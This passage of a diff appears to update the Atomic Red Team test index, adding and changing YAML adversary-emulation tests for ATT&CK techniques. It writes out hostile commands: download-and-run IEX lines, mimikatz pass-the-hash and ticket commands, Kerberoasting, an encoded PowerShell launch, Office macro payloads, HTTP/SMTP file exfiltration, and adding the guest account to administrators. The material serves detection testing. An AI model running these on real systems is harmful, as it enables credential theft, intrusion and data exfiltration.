         command: "#{recon_commands}\n"
         name: command_prompt
+    - name: List macOS Firewall Rules
+      auto_generated_guid: ff1d8c25-2aa4-4f18-a425-fede4a41ee88
+      description: "\"This will test if the macOS firewall is enabled and/or show
+        what rules are configured. Must be run with elevated privileges. Upon successful
+        execution, these commands will output various information about the firewall
+        configuration, including status and specific port/protocol blocks or allows.
+        \n\nUsing `defaults`, additional arguments can be added to see filtered details,
+        such as `globalstate` for global configuration (\\\"Is it on or off?\\\"),
+        `firewall` for common application allow rules, and `explicitauths` for specific
+        rules configured by the user. \n\nUsing `socketfilterfw`, flags such as --getglobalstate
+        or --listapps can be used for similar filtering. At least one flag is required
+        to send parseable output to standard out. \n"
+      supported_platforms:
+      - macos
+      executor:
+        command: |
+          sudo defaults read /Library/Preferences/com.apple.alf
+          sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
+        name: bash
+        elevation_required: true
   T1049:
     technique:
       object_marking_refs:
@@ -47697,6 +49100,48 @@ discovery:
           netstat
           who -a
         name: sh
+    - name: System Discovery using SharpView
+      auto_generated_guid: 96f974bb-a0da-4d87-a744-ff33e73367e9
+      description: "Get a listing of network connections, domains, domain users, and
+        etc.  \nsharpview.exe located in the bin folder, an opensource red-team tool.\nUpon
+        successful execution, cmd.exe will execute sharpview.exe <method>. Results
+        will output via stdout.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        SharpView_url:
+          description: sharpview download URL
+          type: url
+          default: https://github.com/tevora-threat/SharpView/blob/b60456286b41bb055ee7bc2a14d645410cca9b74/Compiled/SharpView.exe?raw=true
+        SharpView:
+          description: Path of the executable opensource redteam tool used for the
+            performing this atomic.
+          type: path
+          default: PathToAtomicsFolder\T1049\bin\SharpView.exe
+        syntax:
+          description: Arguements method used along with SharpView to get listing
+            of network connections, domains, domain users, and etc.
+          type: String
+          default: "\"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\"
+            \n"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Sharpview.exe must exist on disk at specified location (#{SharpView})
+
+'
+        prereq_command: 'if (Test-Path #{SharpView}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{SharpView}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest #{SharpView_url} -OutFile "#{SharpView}"
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $syntaxList = #{syntax}
+          foreach ($syntax in $syntaxList) {
+          #{SharpView} $syntax -}
   T1033:
     technique:
       created: '2017-05-31T21:30:35.733Z'
@@ -47786,8 +49231,8 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'');
-          Invoke-UserHunter -Stealth -Verbose
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
+          -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
 
 '
         name: powershell
@@ -52391,7 +53836,7 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         cleanup_command: 'Remove-Item #{jse_path} -ErrorAction Ignore
@@ -52452,7 +53897,7 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         name: powershell
@@ -52490,7 +53935,7 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         name: powershell
@@ -52527,7 +53972,7 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $bat_path `", vbNormalFocus)`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
         name: powershell
@@ -52624,6 +54069,45 @@ execution:
           Stop-Process -Name "procexp*" -ErrorAction Ignore
           Remove-Item "$env:TEMP\atomic_redteam_x4m_exec.vbs" -ErrorAction Ignore
           Remove-Item "$env:TEMP\procexp.exe" -ErrorAction Ignore
+        name: powershell
+    - name: Headless Chrome code execution via VBA
+      auto_generated_guid: a19ee671-ed98-4e9d-b19c-d1954a51585a
+      description: |
+        This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local
+        webserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver
+        and pull down the script and execute it. By default the payload will execute calc.exe on the system.
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Microsoft Word must be installed
+
+'
+        prereq_command: |
+          try {
+            $wdApp = New-Object -COMObject "Word.Application"
+            Stop-Process -Name "winword"
+            exit 0 } catch { exit 1 }
+        get_prereq_command: 'Write-Host "You will need to install Microsoft Word manually
+          to meet this requirement"
+
+'
+      - description: 'Google Chrome must be installed
+
+'
+        prereq_command: |
+          try {
+            $chromeInstalled = (Get-Item (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe').'(Default)').VersionInfo.FileName
+            exit 0
+          } catch { exit 1 }
+        get_prereq_command: 'Write-Host "You will need to install Google Chrome manually
+          to meet this requirement"
+
+'
+      executor:
+        command: |
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
         name: powershell
   T1204.001:
     technique:
@@ -53610,10 +55094,29 @@ execution:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")
-          \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
+        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
+    - name: WMI Invoke-CimMethod Scheduled Task
+      auto_generated_guid: e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b
+      description: 'Create an scheduled task that executes notepad.exe after user
+        login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing
+        as Register-ScheduledTask cmdlet behind the scenes.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $xml = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml")
+          Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
+        cleanup_command: 'Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false
+          >$null 2>&1
+
+'
   T1053:
     technique:
       created: '2017-05-31T21:30:46.977Z'
@@ -53856,6 +55359,7 @@ execution:
           description: Path to PsExec
           type: string
           default: C:\PSTools\PsExec.exe
+      dependency_executor_name: powershell
       dependencies:
       - description: 'PsExec tool from Sysinternals must exist on disk at specified
           location (#{psexec_exe})
@@ -54160,7 +55664,58 @@ execution:
       - root
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1053.006
+    atomic_tests:
+    - name: Create Systemd Service and Timer
+      auto_generated_guid: f4983098-bb13-44fb-9b2c-46149961807b
+      description: "This test creates Systemd service and timer then starts and enables
+        the Systemd timer \n"
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_systemd_service:
+          description: Path to systemd service unit file
+          type: Path
+          default: "/etc/systemd/system/art-timer.service"
+        path_to_systemd_timer:
+          description: Path to service timer file
+          type: Path
+          default: "/etc/systemd/system/art-timer.timer"
+        systemd_service_name:
+          description: Name of systemd service
+          type: String
+          default: art-timer.service
+        systemd_timer_name:
+          description: Name of systemd service timer
+          type: String
+          default: art-timer.timer
+      executor:
+        command: |
+          echo "[Unit]" > #{path_to_systemd_service}
+          echo "Description=Atomic Red Team Systemd Timer Service" >> #{path_to_systemd_service}
+          echo "[Service]" >> #{path_to_systemd_service}
+          echo "Type=simple" >> #{path_to_systemd_service}
+          echo "ExecStart=/bin/touch /tmp/art-systemd-timer-marker" >> #{path_to_systemd_service}
+          echo "[Install]" >> #{path_to_systemd_service}
+          echo "WantedBy=multi-user.target" >> #{path_to_systemd_service}
+          echo "[Unit]" > #{path_to_systemd_timer}
+          echo "Description=Executes Atomic Red Team Systemd Timer Service" >> #{path_to_systemd_timer}
+          echo "Requires=#{systemd_service_name}" >> #{path_to_systemd_timer}
+          echo "[Timer]" >> #{path_to_systemd_timer}
+          echo "Unit=#{systemd_service_name}" >> #{path_to_systemd_timer}
+          echo "OnCalendar=*-*-* *:*:00" >> #{path_to_systemd_timer}
+          echo "[Install]" >> #{path_to_systemd_timer}
+          echo "WantedBy=timers.target" >> #{path_to_systemd_timer}
+          systemctl start #{systemd_timer_name}
+          systemctl enable #{systemd_timer_name}
+          systemctl daemon-reload
+        cleanup_command: |
+          systemctl stop #{systemd_timer_name}
+          systemctl disable #{systemd_timer_name}
+          rm #{path_to_systemd_service}
+          rm #{path_to_systemd_timer}
+          systemctl daemon-reload
+        name: bash
   T1059.004:
     technique:
       id: attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56
@@ -54419,7 +55974,7 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
         cleanup_command: 'Get-WmiObject win32_process | Where-Object {$_.CommandLine
           -like "*mshta*"}  | % { "$(Stop-Process $_.ProcessID)" } | Out-Null
@@ -54456,8 +56011,8 @@ execution:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")
-          \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\"
+        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\"
           -officeProduct \"Word\" -sub \"Extract\"\n"
         cleanup_command: 'Remove-Item "$env:TEMP\atomic_t1059_005_test_output.bin"
           -ErrorAction Ignore
@@ -54545,6 +56100,31 @@ execution:
 
 '
         name: powershell
+    - name: Writes text to a file and displays it.
+      auto_generated_guid: 127b4afe-2346-4192-815c-69042bec570e
+      description: 'Writes text to a file and display the results. This test is intended
+        to emulate the dropping of a malicious file to disk.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_contents_path:
+          description: Path to the file that the command prompt will drop.
+          type: path
+          default: "%TEMP%\\test.bin"
+        message:
+          description: Message that will be written to disk and then displayed.
+          type: string
+          default: Hello from the Windows Command Prompt!
+      executor:
+        command: 'echo "#{message}" > "#{file_contents_path}" & type "#{file_contents_path}"
+
+'
+        cleanup_command: 'del "#{file_contents_path}"
+
+'
+        name: command_prompt
   T1047:
     technique:
       id: attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055
@@ -54724,6 +56304,23 @@ execution:
 '
         cleanup_command: 'wmic /user:#{user_name} /password:#{password} /node:"#{node}"
           process where name=''#{process_to_execute}'' delete >nul 2>&1
+
+'
+        name: command_prompt
+    - name: Create a Process using WMI Query and an Encoded Command
+      auto_generated_guid: 7db7a7f9-9531-4840-9b30-46220135441c
+      description: |
+        Solarigate persistence is achieved via backdoors deployed via various techniques including using PowerShell with an EncodedCommand
+         Powershell -nop -exec bypass -EncodedCommand <encoded command>
+        Where the –EncodedCommand, once decoded, would resemble:
+          Invoke-WMIMethod win32_process -name create -argumentlist ‘rundll32 c:\windows\idmu\common\ypprop.dll _XInitImageFuncPtrs’ -ComputerName WORKSTATION
+        The EncodedCommand in this atomic is the following: Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe
+        You should expect to see notepad.exe running after execution of this test.
+        [Solarigate Analysis from Microsoft](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)
+      supported_platforms:
+      - windows
+      executor:
+        command: 'powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA
 
 '
         name: command_prompt
@@ -55288,8 +56885,10 @@ lateral-movement:
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
       executor:
-        command: "#{mimikatz_path} sekurlsa::pth /user:#{user_name} /domain:#{domain}
-          /ntlm:#{ntlm}\n"
+        command: '#{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain}
+          /ntlm:#{ntlm}"
+
+'
         name: command_prompt
     - name: crackmapexec Pass the Hash
       auto_generated_guid: eb05b028-16c8-4ad8-adea-6f5b219da9a9
@@ -55418,10 +57017,26 @@ lateral-movement:
           description: domain
           type: string
           default: atomic.local
-      executor:
-        command: 'mimikatz # kerberos::ptt #{user_name}@#{domain}
+        mimikatz_exe:
+          description: Path of the Mimikatz binary
+          type: string
+          default: PathToAtomicsFolder\T1550.003\bin\mimikatz.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Mimikatz must exist on disk at specified location (#{mimikatz_exe})
 
 '
+        prereq_command: 'if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+          Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
+          New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
+          Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
+      executor:
+        command: "#{mimikatz_exe} # kerberos::ptt #{user_name}@#{domain}\n"
         name: command_prompt
   T1563.002:
     technique:
@@ -55479,11 +57094,9 @@ lateral-movement:
     atomic_tests:
     - name: RDP hijacking
       auto_generated_guid: a37ac520-b911-458e-8aed-c5f1576d9f46
-      description: 'RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
+      description: "[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
         - how to hijack RDS and RemoteApp sessions transparently to move through an
-        organization
-
-'
+        organization\n"
       supported_platforms:
       - windows
       input_arguments:
@@ -55956,10 +57569,26 @@ lateral-movement:
           description: Remote computer to receive the copy and execute the file
           type: String
           default: "\\\\localhost"
-      executor:
-        command: 'psexec.exe #{remote_host} -accepteula -c #{command_path}
+        psexec_exe:
+          description: Path to PsExec
+          type: string
+          default: C:\PSTools\PsExec.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'PsExec tool from Sysinternals must exist on disk at specified
+          location (#{psexec_exe})
 
 '
+        prereq_command: 'if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+          New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
+          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
+      executor:
+        command: "#{psexec_exe} #{remote_host} -accepteula -c #{command_path}\n"
         name: command_prompt
         elevation_required: true
     - name: Execute command writing output to local Admin Share
@@ -59685,9 +61314,11 @@ exfiltration:
           exit 0; fi;
 
 '
-        get_prereq_command: "if [ ! -d #{folder_path} ]; then mkdir -p #{folder_path};
-          touch #{folder_path}/safe_to_delete; fi;      \ndd if=/dev/urandom of=#{folder_path}/#{file_name}
-          bs=25000000 count=1\n"
+        get_prereq_command: 'if [ ! -d #{folder_path} ]; then mkdir -p #{folder_path};
+          touch #{folder_path}/safe_to_delete; fi; dd if=/dev/urandom of=#{folder_path}/#{file_name}
+          bs=25000000 count=1
+
+'
       executor:
         command: |
           cd #{folder_path}; split -b 5000000 #{file_name}
@@ -60185,6 +61816,57 @@ exfiltration:
           output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1
           | sort | uniq | xxd -p -r\n"
         name: manual
+    - name: Exfiltration Over Alternative Protocol - HTTP
+      auto_generated_guid: 6aa58451-1121-4490-a8e9-1dada3f1c68c
+      description: |
+        Exfiltration of specified file over HTTP.
+        Upon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          $content = Get-Content #{input_file}
+          Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content
+        name: powershell
+      input_arguments:
+        input_file:
+          description: Path to file to exfiltrate
+          type: Path
+          default: C:\Windows\System32\notepad.exe
+        ip_address:
+          description: Destination IP address where the data should be sent
+          type: String
+          default: http://127.0.0.1
+    - name: Exfiltration Over Alternative Protocol - SMTP
+      auto_generated_guid: ec3a835e-adca-4c7c-88d2-853b69c11bb9
+      description: |
+        Exfiltration of specified file over SMTP.
+        Upon successful execution, powershell will send an email with attached file to exfiltrateto a remote address. Results will be via stdout.
+      supported_platforms:
+      - windows
+      executor:
+        command: 'Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1048.003
+          Atomic Test" -Attachments #{input_file} -SmtpServer #{smtp_server}
+
+'
+        name: powershell
+      input_arguments:
+        input_file:
+          description: Path to file to exfiltrate
+          type: Path
+          default: C:\Windows\System32\notepad.exe
+        sender:
+          description: The email address of the sender
+          type: String
+          default: test@corp.com
+        receiver:
+          description: The email address of the receiver
+          type: String
+          default: test@corp.com
+        smtp_server:
+          description: SMTP server to use for email transportation
+          type: String
+          default: 127.0.0.1
   T1567:
     technique:
       external_references:
@@ -60761,18 +62443,27 @@ initial-access:
         allow multiple RDP connections
       supported_platforms:
       - windows
+      input_arguments:
+        guest_user:
+          description: Specify the guest account
+          type: String
+          default: guest
+        guest_password:
+          description: Specigy the guest password
+          type: String
+          default: Password123!
       executor:
         command: |-
-          net user guest /active:yes
-          net user guest Password123!
-          net localgroup administrators guest /add
-          net localgroup "Remote Desktop Users" guest /add
+          net user #{guest_user} /active:yes
+          net user #{guest_user} #{guest_password}
+          net localgroup administrators #{guest_user} /add
+          net localgroup "Remote Desktop Users" #{guest_user} /add
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
-          net user guest /active:no >nul 2>&1
-          net localgroup administrators guest /delete >nul 2>&1
-          net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+          net user #{guest_user} /active:no >nul 2>&1
+          net localgroup administrators #{guest_user} /delete >nul 2>&1
+          net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
         name: command_prompt
@@ -61083,13 +62774,14 @@ initial-access:
 '
       dependency_executor_name: powershell
       dependencies:
-      - description: 'chrome must be installed
+      - description: 'Chrome must be installed
 
 '
-        prereq_command: if (cmd /c "chrome 2>nul") {exit 0} else {exit 1}
-        get_prereq_command: |
-          Invoke-WebRequest -OutFile $env:temp\ChromeStandaloneSetup64.exe #{chrome_url}
-          Start-Process $env:temp\ChromeStandaloneSetup64.exe /S
+        prereq_command: if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe")
+          -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"))
+          {exit 0} else {exit 1}
+        get_prereq_command: "Invoke-WebRequest -OutFile $env:temp\\ChromeStandaloneSetup64.exe
+          #{chrome_url}\nStart-Process $env:temp\\ChromeStandaloneSetup64.exe /S     \n"
       executor:
         name: powershell
         elevation_required: true
@@ -61098,10 +62790,10 @@ initial-access:
           foreach ($extension in $extList) {
             New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
             New-ItemProperty -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}
-          Start-Process -FilePath "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+          Start chrome
           Start-Sleep -Seconds 30
           Stop-Process -Name "chrome"
-        cleanup_command: |-
+        cleanup_command: |
           $extList = #{extension_id}
           foreach ($extension in $extList) {
           Remove-Item -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -ErrorAction Ignore}
@@ -61433,7 +63125,7 @@ initial-access:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         cleanup_command: 'Remove-Item #{jse_path} -ErrorAction Ignore
